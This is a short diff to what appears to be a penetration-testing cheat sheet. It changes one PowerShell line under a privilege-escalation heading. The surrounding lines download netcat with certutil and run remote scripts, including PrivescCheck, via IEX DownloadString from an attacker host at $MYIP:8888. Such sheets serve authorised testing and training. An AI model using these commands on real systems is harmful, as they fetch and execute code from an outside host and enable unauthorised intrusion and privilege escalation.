@@ -1400,7 +1400,7 @@ certutil -urlcache -f http://$MYIP:8888/windows/nc.exe \programdata\nc.exe
 
 [*] Privilege Escalation
 +---------- Priv Check ----------+
-IEX (New-Object Net.WebClient).DownloadString('http://$MYIP:8888/whoami.ps1')
+IEX (New-Object Net.WebClient).DownloadString('http://$MYIP:8888/whoami')
 
 +---------- Full Privesc Scan ----------+
 IEX (New-Object Net.WebClient).DownloadString('http://$MYIP:8888/PrivescCheck.ps1');Invoke-PrivescCheck
